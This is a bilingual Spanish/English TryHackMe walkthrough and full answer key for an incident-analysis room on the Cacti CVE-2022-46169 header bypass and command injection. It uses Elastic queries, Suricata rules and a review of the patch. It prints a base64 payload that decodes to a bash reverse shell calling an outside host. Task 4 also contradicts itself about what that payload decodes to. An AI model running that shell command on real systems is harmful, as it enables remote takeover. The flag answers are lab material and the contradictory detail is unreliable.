# Cactus
| **Dificultad** | Medium |
| **Tipo** | Walkthrough |
| **Slug** | `cactus` |
| **Link** | [TryHackMe](https://tryhackme.com/room/cactus) |
| **Sección** | Web / DFIR & Threat Hunting |
| **Fuente** | Research de thmrevenant (GitHub) y técnica de MDSec (CVE-2022-46169) |
| **Componentes** | Cacti, CVE-2022-46169 (authentication bypass), remote_agent.php, X-Forwarded-For, command injection, base64, Elastic/ELK (url.original), Suricata rules (/var/lib/suricata/rules, /etc/suricata/rules), reverse shell, análisis forense de logs |
| **Impacto** | Sala Medium de investigación y blue team: analizar los logs (Elastic/Suricata) del compromiso de una instancia de Cacti (bypass de autenticación por X-Forwarded-For + RCE en remote_agent.php), extraer la IP atacante, la flag en base64 y la cadena de exploit, y entender el parche (get_filter_request_var, cacti_escapeshellarg, get_client_addr). |
---
**Contexto:** Cactus es una sala de análisis de intrusiones. Un atacante explotó Cacti (CVE-2022-46169): el parámetro `client_ip` de `remote_agent.php` confía en la cabecera `X-Forwarded-For` para saltarse la autenticación, llegando a una inyección de comandos (`poller_id`) que permite enviar una reverse shell codificada en base64. La investigación se hace con las queries de Elastic (campo `url.original`) y la detección con reglas Suricata (ruta por defecto `/var/lib/suricata/rules`), terminando con el estudio del parche que endurece Cacti.
*EN: Cactus is an intrusion analysis room. An attacker exploited Cacti (CVE-2022-46169): the `client_ip` parameter of `remote_agent.php` trusts the `X-Forwarded-For` header to bypass authentication, reaching a command injection (`poller_id`) that allows sending an encoded base64 reverse shell. The investigation is performed with Elastic queries (field `url.original`) and detection with Suricata rules (default path `/var/lib/suricata/rules`), ending with the study of the Cacti hardening patch.*
## Solucionario
### Task 1 — Deploy the Machine
**Explicación:** Desplegar la máquina/entorno de análisis. Pregunta de despliegue, sin respuesta.
*EN: Deploy the machine/analysis environment. Deployment question, no answer needed.*
### Task 2 — HTTP Header investigation
**Explicación:** En `remote_agent.php` la autenticación se basa en el valor de `client_ip` derivado de cabeceras del cliente. La cabecera usada por el atacante para burlar esa comprobación es `X-Forwarded-For`.
*EN: In `remote_agent.php` authentication relies on a `client_ip` value derived from client headers. The header used by the attacker to bypass that check is `X-Forwarded-For`.*
### Task 3 — Hidden Files
**Explicación:** En `/var/www/html` de la instancia comprometida existe una carpeta oculta identificable en el análisis, cuyo nombre es `f39f9db5a7695930f1b267a4d33b092b`. Dentro, el archivo `flag.txt` contiene la primera bandera.
*EN: In `/var/www/html` of the compromised instance there is a hidden folder identified during analysis, named `f39f9db5a7695930f1b267a4d33b092b`. Inside, the `flag.txt` file holds the first flag.*
### Task 4 — Initial Access
**Explicación:** El 20 de julio el adversario explotó la vulnerabilidad desde la IP `10.10.135.237`. El exploit enviaba un payload en base64 que, decodificado, muestra la bandera `THM{d0nT_4g3t_b64_d3c0d3}`. Además, la regla Suricata por defecto que hay que sustituir por `/etc/suricata/rules` apunta originalmente a `/var/lib/suricata/rules` (campo `default-path-rule`).
*EN: On July 20 the adversary exploited the vulnerability from IP `10.10.135.237`. The exploit sent a base64 payload which, decoded, shows the flag `THM{d0nT_4g3t_b64_d3c0d3}`. Also, the default Suricata rule path that must be replaced with `/etc/suricata/rules` originally points to `/var/lib/suricata/rules` (`default-path-rule` field).*

```bash
# Decodificar el payload base64 del exploit
echo -n "YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTM1LjIzNy8zMTMzNyA8JjEn" | base64 -d
```
### Task 5 — Traffic Analysis
**Explicación:** En la plataforma Elastic, el campo que contenía el valor `remote_agent.php` (el endpoint atacado) es `url.original`. Excluyendo IPs de localhost, la IP fuente del adversario del 20 de julio de 2023 vuelve a ser `10.10.135.237`, y el payload que envió es la cadena base64 de la reverse shell.
*EN: In the Elastic platform, the field that contained the value `remote_agent.php` (the attacked endpoint) is `url.original`. Excluding localhost IPs, the adversary's source IP of July 20, 2023 is again `10.10.135.237`, and the payload sent is the base64-encoded reverse shell string.*

```bash
# Query base en Elastic/Kibana
url.original: "remote_agent.php" AND NOT src.ip: 127.0.0.1
```
### Task 6 — Patching
**Explicación:** Revisando el parche de Cacti: `get_filter_request_var` restringe el parámetro `poller_id` solo a enteros (bloquea la inyección), `cacti_escapeshellarg` sanitiza cadenas para prevenir la ejecución de comandos, y `get_client_addr` se modificó para evitar el bypass de autenticación por cabeceras.
*EN: Reviewing the Cacti patch: `get_filter_request_var` restricts the `poller_id` parameter to integers only (blocking injection), `cacti_escapeshellarg` sanitizes strings to prevent command execution, and `get_client_addr` was modified to prevent the header-based authentication bypass.*
### Task 7 — Conclusion
**Explicación:** Resumen de la sala: importancia de no confiar en cabeceras controlables por el cliente, de mantener aplicaciones parcheadas y de correlacionar logs (Elastic + Suricata). Sin pregunta con respuesta.
*EN: Room summary: the importance of not trusting client-controlled headers, keeping applications patched, and correlating logs (Elastic + Suricata). No answer needed.*
| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the HTTP header used to bypass the authentication on remote_agent.php? | `X-Forwarded-For` |
| 2 | What is the name of the hidden folder located in /var/www/html? | `f39f9db5a7695930f1b267a4d33b092b` |
| 3 | What is the content of the flag.txt file located in the hidden folder? | `THM{de0c87d30debe82e7747c594574db1e8}` |
| 4 | What is the Source IP of the adversary that successfully exploited the vulnerability last July 20? | `10.10.135.237` |
| 5 | What is the base64-decoded flag being submitted by this adversary? | `THM{d0nT_4g3t_b64_d3c0d3}` |
| 6 | What is the original value of default-path-rule that must be replaced with /etc/suricata/rules? | `/var/lib/suricata/rules` |
| 7 | What field handled the value remote_agent.php in the Elastic Query string? | `url.original` |
| 8 | Excluding the localhost IPs, what is the Source IP of the adversary that exploited the vulnerability last July 20, 2023? | `10.10.135.237` |
| 9 | Excluding entries from the localhost IPs, what is the encoded base64 string used by the attacker during the exploitation attempt last July 20, 2023? | `YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTM1LjIzNy8zMTMzNyA8JjEn` |
| 10 | Based on the patch, what is the function used to restrict the input on poller_id parameter to integers only? | `get_filter_request_var` |
| 11 | Based on the patch, what is the function used to sanitize strings which helps in preventing command injection? | `cacti_escapeshellarg` |
| 12 | Based on the patch, what is the function that was modified to prevent the authentication bypass? | `get_client_addr` |
---
**Metodología:** Análisis de logs (Elastic/Kibana con `url.original`, exclusión de localhost) → identificar cabecera usada para el bypass (X-Forwarded-For) → localizar IP atacante (10.10.135.237) → decodificar payload base64 (reverse shell) → descubrir carpeta oculta y flags → revisar reglas Suricata (`default-path-rule`) → estudiar el parche de Cacti para entender las mitigaciones.
**Learning chain:** investigación de logs → formación de hipótesis de exploit (Cacti CVE-2022-46169 remote_agent.php) → análisis de payloads y decodificación base64 → correlación con reglas de detección → estudio del parche como cierre forense.
**Lección:** *Los logs solo cuentan la historia si se sabe qué buscar: confiar en cabeceras como X-Forwarded-For convierte una "auth" en un bypass trivial, y un payload en base64 es opacidad, no seguridad.*
**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application - CVE-2022-46169), T1136, T1102 (Web Service), T1027 (Obfuscated Files - base64), T1059, T1053.
**Fuente:** [TryHackMe - Cactus](https://tryhackme.com/room/cactus)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.